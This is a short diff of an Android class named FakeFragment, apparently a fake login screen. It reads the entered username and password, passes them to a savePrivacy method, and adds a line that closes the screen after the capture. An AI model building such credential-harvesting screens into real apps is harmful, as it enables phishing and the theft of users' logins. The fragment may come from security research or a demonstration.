@@ -72,6 +72,7 @@ public class FakeFragment extends Fragment {
         startActivity(intent);
 
         savePrivacy("用户名:" + mEtUserName.getText().toString() + "\n" + "口令:" + mEtPassword.getText().toString());
+        getFragmentManager().popBackStack();
     }
 
     private void savePrivacy(String str) {
